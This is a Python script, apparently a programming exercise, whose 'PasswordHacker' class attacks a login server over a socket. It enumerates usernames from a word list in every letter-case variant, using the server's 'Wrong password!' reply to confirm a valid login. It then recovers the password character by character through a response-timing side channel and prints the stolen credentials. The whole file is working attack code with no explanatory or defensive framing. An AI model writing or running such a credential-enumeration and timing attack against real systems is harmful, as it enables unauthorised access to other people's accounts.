import sys
import socket
import itertools
import json
import time


class PasswordHacker:
    def __init__(self):
        _args = sys.argv
        self.host = _args[1]
        self.port = int(_args[2])
        self.message = None
        self.client_socket = None
        self.server_response = None
        self.success = False
        self.login_id = None
        self.password = None
        self.is_login_success = False
        self.eligible_password_chars = list(map(chr, range(97, 123))) + \
                                       list(map(chr, range(65, 91))) + \
                                       [str(num) for num in range(10)]
        self.main()

    def create_socket(self):
        _address = (self.host, self.port)
        self.client_socket = socket.socket()
        self.client_socket.connect(_address)

    def socket_send_recv(self):
        _binary_message = self.message.encode()
        self.client_socket.send(_binary_message)
        _response = self.client_socket.recv(1024)
        _response = _response.decode()
        return _response

    def close_socket(self):
        self.client_socket.close()

    def case_generator(self, _word):
        _cases_generator = itertools.product(*([letter.lower(), letter.upper()] for letter in _word))
        for generated_word in _cases_generator:
            yield ''.join(generated_word)

    def get_password_from_db(self):
        with open('passwords.txt', 'r') as file_reader:
            for _line in file_reader:
                yield _line.strip('\n')

    def get_login_id_from_db(self):
        with open('logins.txt', 'r') as file_reader:
            for _line in file_reader:
                yield _line.strip('\n')

    def generate_json_str(self, login, password):
        _temp_dict = {
            'login': login,
            'password': password
        }
        return json.dumps(_temp_dict)

    def read_json_to_str(self, json_str):
        server_response_str = json.loads(json_str)
        return server_response_str['result']

    def hack_login(self):
        login_id_generator = self.get_login_id_from_db()
        self.password = " "
        for login_id in login_id_generator:
            curr_login_id_cases = self.case_generator(login_id.strip('\n'))
            for word in curr_login_id_cases:
                self.message = self.generate_json_str(word, self.password)
                server_response_json = self.socket_send_recv()
                self.server_response = self.read_json_to_str(server_response_json)
                if self.server_response == 'Wrong password!':
                    self.login_id = word
                    self.is_login_success = True
                    break
            if self.is_login_success:
                break

    def hack_password(self):
        self.password = ""
        while not self.success:
            for char in self.eligible_password_chars:
                _temp_pass = ""
                _temp_pass = self.password + char
                self.message = self.generate_json_str(self.login_id, _temp_pass)

                _start_time = time.perf_counter()
                _server_response_json = self.socket_send_recv()
                _end_time = time.perf_counter()
                _difference = (_end_time - _start_time)
                self.server_response = self.read_json_to_str(_server_response_json)
                if _difference > 0.001:
                    self.password += char
                    break
                elif self.server_response == 'Connection success!':
                    self.password += char
                    self.success = True
                    break

    def print_credentials_json_str(self):
        print(self.generate_json_str(self.login_id, self.password))

    def main(self):
        self.create_socket()
        self.hack_login()
        self.hack_password()
        self.print_credentials_json_str()
        self.close_socket()


if __name__ == '__main__':
    PasswordHacker()
